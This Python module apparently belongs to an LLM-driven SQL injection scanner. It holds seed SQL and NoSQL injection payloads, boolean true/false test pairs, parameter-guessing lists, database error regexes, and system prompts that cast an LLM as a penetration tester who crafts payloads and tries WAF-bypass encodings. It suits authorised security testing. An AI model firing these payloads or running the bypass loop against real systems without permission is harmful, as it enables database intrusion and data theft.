"""Seed payloads and LLM system prompts."""

# Classic SQLi payloads used as starting points before LLM adapts
SEED_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "'; WAITFOR DELAY '0:0:3'--",
    "' OR SLEEP(3)--",
    "1; SELECT pg_sleep(3)--",
    "admin'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
]

# Common parameter names to guess when a URL exposes none (param mining).
# Ordered by how often they carry injectable values in real APIs.
COMMON_PARAMS = [
    # Generic
    "query", "q", "id", "search", "s", "name", "user", "username", "email",
    "cat", "category", "filter", "sort", "order", "orderby", "field", "column",
    "table", "sql", "keyword", "term", "value", "val", "key", "page", "limit",
    "offset", "product", "item", "pid", "uid", "type", "action", "view",
    "lang", "ref", "url", "path", "file", "dir", "date", "from", "to", "code",
    # E-commerce / cart
    "cartitem", "cart_item", "cart", "itemid", "item_id", "productid",
    "product_id", "sku", "qty", "quantity", "price", "amount",
    "order_id", "orderid", "invoice",
    # Auth / user management
    "password", "pass", "pwd", "token", "session", "hash",
    "login", "register", "account", "profile",
    # Common web app params
    "msg", "message", "comment", "subject", "body", "content", "text",
    "title", "tag", "tags", "status", "mode", "format", "output",
    "callback", "redirect", "next", "return", "goto",
    # PHP / CGI classics
    "searchquery", "query_string", "keyword", "words", "phrase",
]


# Boolean-blind true/false pairs for structural detection.
# Each tuple is (true_payload, false_payload) — true should return data,
# false should return no/different data. Works on string AND numeric params.
BOOLEAN_PAIRS = [
    ("' OR '1'='1", "' OR '1'='2"),
    ("' AND '1'='1", "' AND '1'='2"),
    (" OR 1=1--", " OR 1=2--"),
    (" AND 1=1--", " AND 1=2--"),
    ("1 OR 1=1--", "1 OR 1=2--"),
    ("1 AND 1=1--", "1 AND 1=2--"),
    ("') OR ('1'='1", "') OR ('1'='2"),
    ("1' OR '1'='1' --", "1' OR '1'='2' --"),
    # Paren-closing variants for LIKE '%...%' inside ((...)) contexts
    # (e.g. OWASP Juice Shop product search). true returns rows, false none.
    ("')) OR (('1'='1", "')) OR (('1'='2"),
    ("%')) OR (('%'='", "%')) AND (('%'='x"),
    ("')) UNION SELECT NULL-- -", "')) UNION SELECT NULL WHERE 1=2-- -"),
]

# Boolean OR/AND *amplification* pairs (Nuclei-style postfix fuzzing). Appended
# to the original value: the OR-true form makes the WHERE clause always true so
# the endpoint returns MORE rows (response grows vs baseline); the AND-false
# form makes it always false so it returns fewer/none (response shrinks). The
# asymmetry (OR >> baseline >> AND) is a strong boolean-SQLi signal that works
# even when the app never emits an error.
BOOLEAN_AMPLIFY_PAIRS = [
    ("' OR '1'='1", "' AND '1'='2"),
    (" OR 1=1-- -", " AND 1=2-- -"),
    ("') OR ('1'='1", "') AND ('1'='2"),
    ("' OR '1'='1'-- -", "' AND '1'='2'-- -"),
]

# Classic AND-based boolean pairs for the sqlmap-style RATIO test: the TRUE
# form keeps the query result identical to the original (page ~ unchanged),
# the FALSE form makes it return nothing (page diverges). Detection compares
# content-similarity ratios (TRUE≈original, FALSE≠original) rather than length,
# after stripping dynamic content — so it works on pages with timestamps/tokens
# and on blind injections that never grow/shrink the body dramatically.
BOOLEAN_AND_PAIRS = [
    (" AND 1=1-- -", " AND 1=2-- -"),
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND '1'='1'-- -", "' AND '1'='2'-- -"),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ('" AND "1"="1', '" AND "1"="2'),
]

# NoSQL injection — boolean true/false pairs. A "true" payload should return
# data (match), the "false" should return none. Covers MongoDB/MarsDB (Juice
# Shop uses MarsDB for order tracking), which sqlmap does not test.
NOSQL_PAIRS = [
    ("' || '1'=='1", "' || '1'=='2"),
    ("'||'1'=='1", "'||'1'=='2"),
    ("' || 'a'=='a", "' || 'a'=='b"),
    ("1' || '1'=='1", "1' || '1'=='2"),
]

# NoSQL error signatures (returned when a NoSQL query is malformed)
NOSQL_ERROR_PATTERNS = [
    r"MongoError",
    r"MongoServerError",
    r"CastError",
    r"BSONError",
    r"BSONTypeError",
    r"\$where",
    r"MarsDB",
    r"unexpected token.*in JSON",
    r"E11000 duplicate key",
    r"failed to parse",
]

# Regex patterns for quick pre-LLM triage
SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your MySQL",
    r"Unknown column",
    r"PostgreSQL.*ERROR",
    r"pg_query\(\)",
    r"PSQLException",
    r"SQLite[0-9]?[ ._:/-]{0,2}(error|exception)",
    r"sqlite3\.OperationalError",
    r"Microsoft SQL Native Client error",
    r"ODBC SQL Server Driver",
    r"Unclosed quotation mark",
    r"quoted string not properly terminated",
    r"ORA-\d{5}",
    r"Oracle error",
    r"SQLSTATE\[",
    r"Syntax error.*SQL",
    r"SQL error",
    r"database error",
    r"Query failed",
    r"mysqli",
    r"PDOException",
    r"SQLITE_ERROR",

    # Generic PostgreSQL / TypeORM / Sequelize / node driver errors
    # (BrokenCrystals & most modern Node/NestJS apps surface these)
    r"QueryFailedError",              # TypeORM
    r"SequelizeDatabaseError",        # Sequelize
    r"syntax error at or near",       # PostgreSQL
    r"unterminated quoted string",    # PostgreSQL
    r"invalid input syntax for",      # PostgreSQL
    r"column .* does not exist",      # PostgreSQL
    r"relation .* does not exist",    # PostgreSQL
    r"operator does not exist",       # PostgreSQL
    r"psycopg2\.",                    # Python pg driver
    r"asyncpg\.",                     # async pg driver
    r"error: .*at character \d+",     # pg error with position

    # Generic SQLite (node better-sqlite3 / python)
    r"no such table",
    r"no such column",
    r"unrecognized token",
    r'near ".*": syntax error',
    r"incomplete input",

    # MySQL / MariaDB — note: MariaDB errors say "MariaDB" not "MySQL"
    r"You have an error in your SQL syntax",
    r"check the manual that corresponds to your (MySQL|MariaDB) server",
    r"supplied argument is not a valid MySQL",
    r"com\.mysql\.jdbc",
    r"MariaDB server version",
    r"mysql_fetch_array\(\)",
    r"mysql_num_rows\(\)",
    r"DBD::mysql",           # Perl DBI/DBD MySQL driver (BadStore uses this)
    r"execute failed:",      # Perl DBI execute failed
    r"syntax to use near",   # MariaDB/MySQL generic syntax error
    r"XPATH syntax error",   # MySQL EXTRACTVALUE error-based exfil
    r"Illegal mix of collations",  # MySQL
    r"Column count doesn't match", # MySQL UNION column mismatch
    r"ERROR 1064",           # MySQL generic syntax error code
    r"ERROR 1105",           # MySQL unknown error
    r"Warning.*DBD",         # Perl DBD warning

    # Generic catch-alls seen in JSON error bodies
    r"SQLException",
    r"DatabaseError",
    r"OperationalError",
    r"ProgrammingError",
    r"IntegrityError",
]

AGENT_SYSTEM_PROMPT = """You are an expert penetration tester specializing in SQL injection.
You analyze HTTP request/response pairs and decide the next testing step.

Your job:
1. Compare baseline vs injected responses for SQL injection indicators
2. Identify database type from error messages or behavior
3. Craft context-aware payloads for the specific parameter and app
4. Distinguish true positives from WAF blocks, generic errors, or noise
5. Escalate from detection to confirmation with minimal requests

Respond ONLY with valid JSON (no markdown fences):
{
  "action": "inject" | "confirm" | "skip" | "done",
  "payload": "<next payload or null>",
  "injection_type": "error_based" | "boolean_blind" | "time_blind" | "union_based" | "stacked" | "unknown",
  "reasoning": "<brief explanation>",
  "confidence": 0.0-1.0,
  "db_hint": "<mysql|postgresql|sqlite|mssql|oracle|unknown or null>",
  "vulnerable": true/false,
  "evidence": "<what indicates vulnerability, if any>"
}

Rules:
- Prefer error-based detection first, then boolean blind, then time-based
- Adapt quote style to parameter context (numeric vs string)
- If WAF detected (403, blocked, captcha), try encoding/bypass payloads
- Set action=confirm when confidence >= 0.8 with clear evidence
- Set action=done when all promising vectors exhausted
- Keep payloads practical and single-request testable
"""

ANALYZE_TARGET_PROMPT = """Analyze this target and suggest the first 3 payloads to test.

Target URL: {url}
Method: {method}
Injection point: {param} ({location})
Original value: {original_value}
Content-Type: {content_type}
Baseline status: {status}
Baseline response excerpt (first 2000 chars):
{baseline_body}

Respond ONLY with valid JSON:
{{
  "db_hint": "<best guess or unknown>",
  "param_type": "numeric|string|unknown",
  "waf_detected": true/false,
  "payloads": ["payload1", "payload2", "payload3"],
  "reasoning": "<why these payloads>"
}}
"""
